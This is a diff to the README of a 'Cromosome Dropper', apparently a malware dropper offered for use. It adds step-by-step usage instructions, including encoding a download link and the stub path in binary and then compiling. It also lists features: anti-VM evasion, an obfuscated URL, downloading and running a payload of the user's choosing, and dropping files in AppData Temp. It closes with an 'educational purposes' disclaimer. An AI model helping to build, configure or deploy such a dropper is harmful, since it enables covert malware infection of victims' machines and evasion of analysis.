@@ -1,7 +1,14 @@
 ```sh-session
 Cromosome Dropper
-
+#################
 **How to use?**
+#################
+1. Open the Dropper Class
+2. Convert your direct download link to Binary (https://www.rapidtables.com/convert/number/ascii-to-binary.html)
+3. Convert the Directory\\Stub.exe to Binary
+4. Compile and use It
+
+#################
 
 Features
 Anti VM
@@ -10,8 +17,12 @@ Binary Encrypted URL
 Downloads & runs a payload of your choosing
 Drops file in *AppData Temp*
 
+#################
+
 Credits
 qwqdanchun For AntiVM method https://github.com/qwqdanchun
+
+#################
 
 Warning
 This was made for educational purposes and is not meant for Malicious use.
